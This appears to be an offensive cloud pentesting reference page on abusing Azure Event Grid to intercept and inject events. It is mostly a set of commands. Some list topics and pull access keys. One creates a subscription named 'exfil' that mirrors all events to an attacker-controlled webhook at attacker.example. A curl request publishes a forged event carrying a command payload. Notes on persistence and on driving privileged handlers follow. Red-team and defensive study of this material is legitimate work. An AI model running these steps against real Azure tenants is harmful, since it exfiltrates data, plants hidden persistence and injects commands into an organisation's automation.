---
title: "Event Grid: intercepting and injecting events through subscriptions"
description: "Abusing Azure Event Grid topics and subscriptions to intercept or inject events."
keywords:
  - Event Grid
  - topic
  - subscription
  - event
  - injection
---

# Event Grid

Event Grid routes events from publishers (Azure resources or custom topics) to handlers through **event subscriptions**. With write access to a topic's subscriptions you add a subscription that delivers a copy of every matching event to an endpoint you control, and with the topic's access key you publish forged events that downstream handlers act on.

## Enumerating topics and subscriptions

```bash
az eventgrid topic list -o table
az eventgrid topic key list --name <topic> -g <rg>
az eventgrid event-subscription list --source-resource-id <topic-resource-id> -o table
```

## Intercepting and injecting

```bash
# add a subscription that mirrors events to an attacker-controlled webhook
az eventgrid event-subscription create \
  --name exfil --source-resource-id <topic-resource-id> \
  --endpoint https://attacker.example/collect

# publish a forged event with the topic key (handlers trust the topic)
curl -X POST "<topic-endpoint>" -H "aeg-sas-key: <topic-key>" \
  -d '[{"id":"1","eventType":"forged","subject":"x","dataVersion":"1.0","data":{"cmd":"run"}}]'
```

## Exploitation notes

- A mirror subscription is persistence as well as capture: it keeps delivering events until an operator notices the extra subscription.
- Forged events reach whatever the topic fans out to (Functions, Logic Apps, webhooks), so a trusted-looking event can drive automation or privileged handlers.
- System topics on Azure resources (storage, resource groups) leak operational signal (blob created, resource changed) useful for timing and targeting.

## Tools

- **Azure CLI** (`az eventgrid`): topic, key, and subscription management.
- **MicroBurst**: surfaces topic keys from configuration and Key Vaults.

## References

- [HackTricks Cloud: Azure Event Grid](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft: Event Grid security and authentication](https://learn.microsoft.com/azure/event-grid/security-authentication)
